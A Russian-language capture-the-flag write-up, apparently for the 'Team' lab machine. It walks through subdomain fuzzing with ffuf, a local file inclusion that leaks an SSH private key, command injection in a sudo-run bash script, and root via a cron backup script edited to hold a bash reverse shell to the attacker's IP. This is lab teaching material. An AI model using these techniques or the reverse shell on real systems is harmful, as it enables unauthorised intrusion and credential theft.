### ДЛЯ РЕШЕНИЯ НЕОБХОДИМО:
- терпение для постоянного фаззинга
- уметь эксплуатировать уязвимость lfi
- минимальное понимание bash и command injection
### ВЗЯТИЕ ШЕЛЛА
сначала сканируем порты(массканом, потом нмапом). в принципе, все по классике, плюс видим ftp, но без анонимного доступа, так что на него пока можно забить. на 80 порту видим заглушку (стандартную страничку апаче)

<img width="600" height="300" alt="image" src="https://github.com/user-attachments/assets/9a153a73-6d3c-4d40-9737-c2bcc2873916" />

делать нечего - фаззим. пофаззила поддиректории через ffuf по словарю rockyou.txt с расширениями .php (ну, наиболее вероятный вариант языка для апаче) и .html - пусто. посмотрела сабдомены - тоже ничего. от безнадежности попробовала поменять домен в /etc/hosts на team.thm - сработало(честно говоря, похоже больше не на пентест, а на угадайку🙄). Оказываемся на пустеньком сайте, где ничего не тыкается (в коде страницы нашла пути к картинкам, попробовала побрутфорсить их номера в поиске idor (```http://team.thm/images/fulls/01.jpg```) - безрезультатно). пофаззила поддиректории, но все, что нашла, оказалось либо бесполезным (как пустой robots.txt), либо на просмотр страниц (/scripts, /assets) не хватало прав

<img width="600" height="300" alt="image" src="https://github.com/user-attachments/assets/aa713d58-262a-488c-b18b-83c9564ad3ad" />

попробовала http verb tampering, используя разные http методы для запросов. тоже пусто. решила пофаззить сабдомены (```ffuf -u http://team.thm/ -H 'Host: FUZZ.team.thm' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -ic -c -fs 11366```). и - о чудо - сдвинулись с мертвой точки

<img width="600" height="70" alt="image" src="https://github.com/user-attachments/assets/140e9406-fee9-423e-83e7-d7e948a5f811" />

снова заходим в /etc/hosts, меняем домен на dev.team.thm, переходим на сайт. и видим чисто по учебнику оформленную потенциальную lfi

<img width="600" height="100" alt="image" src="https://github.com/user-attachments/assets/c58e98a3-9dbc-488b-8d8a-bfa3ff192d57" />

попробуем directory traversal. бинго! теперь мы можем читать системные файлы. узнав пользователей, попробовала прочитать их приватные ssh ключи (```../../home/gyles/.ssh/id_rsa```), но страница ничем не ответила

<img width="600" height="150" alt="image" src="https://github.com/user-attachments/assets/5baa2886-9f04-463f-adcc-9542337df538" />

после попробовала получить доступ к /var/log/apache2/access.log для log poisoning, но прочитать не удалось - опять пусто. кук для session poisoning у нас нет (попробовала создать куки с именем PHPSESSID и проверить в /var/lib/php/sessions/sess_12345, но ничего не сохранилось. потеряно). Раз стандартные векторы атаки не прошли - снова фаззим по спец словарю для lfi (```ffuf -u http://dev.team.thm/script.php?page=FUZZ -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -ic -c -fs 1,2203```). полазив по доступным файлам, нашла приватный ssh ключ в sshd_config

<img width="600" height="456" alt="image" src="https://github.com/user-attachments/assets/4ec6f0f6-7ec9-47bc-bc09-5666ba15b28e" />

копируем ключ в какой-нибудь файл, забираем у него лишние права, чтобы ssh не ругался (```chmod 700 ssh```) и подключаемся за одного из ранее найденного в /etc/passwd юзера и забираем первый флаг

<img width="600" height="100" alt="image" src="https://github.com/user-attachments/assets/a9bf7725-2bd5-4da7-8790-6be46e79f89d" />

### Взятие рута

вообще, признаюсь честно, тк машина легкая - нормально сканировать поленилась, поэтому просто доверилась автору и позволила вести себя за ручку, выполняя то, на что он очевидно намекает.

первым делом проверила ```sudo -l``` и увидела, что можно без пароля запускать какой-то файл от имени gyles. видимо, от нас хотят, чтобы мы сначала взяли gules'а, а через него уже рута. окей, попытаемся сначала взять его

<img width="600" height="100" alt="image" src="https://github.com/user-attachments/assets/31572b55-987e-48e7-bfc8-169b33690432" />

смотрим скрипт и видим $error (в bash $ переменная без кавычек заставляет интерпретатор разбить строку на слова и первое слово трактовать как команду, а остальные - как аргументы этой команды), а это значит, что мы можем внедрить в скрипт инъекцию

<img width="600" height="300" alt="image" src="https://github.com/user-attachments/assets/690e135c-102e-48c3-89ca-ef08f517be52" />

исполняем скрипт от пользователя gyles (```sudo -u gyles ./admin_checks```), запускаем от его имени оболочку

<img width="600" height="52" alt="image" src="https://github.com/user-attachments/assets/21b72aa0-4361-4ae3-9efb-acd0d0d4dffe" />

по выводу команды id видим, что gyles состоит в группе admin, которой не было у юзера vale. предположила, что решение будет идти от этого, поэтому попробовала поискать через find файлы (желательно какие-нибудь кронтабы) у которых владелец рут, а группа с правами на редактирование - admin. и нашла!

<img width="600" height="191" alt="image" src="https://github.com/user-attachments/assets/5a003236-d2e1-4997-9591-03d7f3606c85" />

видим загадочный файл main_backup.sh (интересно, что же он делает? может быть, бэкапит файлы каждую минуту от рута?). проверяем папку /var/backups/www/team.thm, чтобы убедиться

<img width="600" height="194" alt="image" src="https://github.com/user-attachments/assets/3999b551-80d1-43b0-bee4-4bb779375f17" />

действительно, последний бэкап был минуту назад, а это подтверждает мою гипотезу. поэтому отредачила файл main_backup.sh и закинула в него реверсшелл (```bash -c "bash -i >& /dev/tcp/your_ip/5555 0>&1"```), открыла у себя порт и словила рута

<img width="600" height="152" alt="image" src="https://github.com/user-attachments/assets/1b29dbd4-c761-45eb-a365-4374392a0b86" />

второй флаг взят🥱
